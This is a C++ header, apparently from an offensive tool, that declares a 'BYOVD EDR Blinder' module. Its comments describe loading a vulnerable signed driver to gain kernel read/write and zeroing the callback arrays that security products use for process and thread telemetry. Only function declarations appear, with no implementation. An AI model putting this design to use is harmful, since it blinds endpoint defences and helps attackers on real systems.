#pragma once

#include <windows.h>

// BYOVD EDR Blinder (Phase 5)
//
// "Bring Your Own Vulnerable Driver"
// Loads a known vulnerable signed driver (like RTCore64.sys or gdrv.sys)
// to gain arbitrary arbitrary Kernel Read/Write primitives from user mode.
// 
// It uses these primitives to find and zero out the kernel callback arrays 
// used by EDRs, such as:
// - ObRegisterCallbacks (Process/Thread handle stripping)
// - PsSetCreateProcessNotifyRoutine (Process creation telemetry)
// - PsSetCreateThreadNotifyRoutine (Thread creation telemetry)
//
// Effectively blinds the EDR at ring-0.

namespace Byovd {

// Load the vulnerable driver and patch out kernel EDR callbacks.
// Returns true if successful.
bool BlindEdr();

// Expose arbitrary read/write primitives just in case.
bool ReadKernelMemory(ULONG64 address, PVOID buffer, SIZE_T size);
bool WriteKernelMemory(ULONG64 address, PVOID buffer, SIZE_T size);

} // namespace Byovd
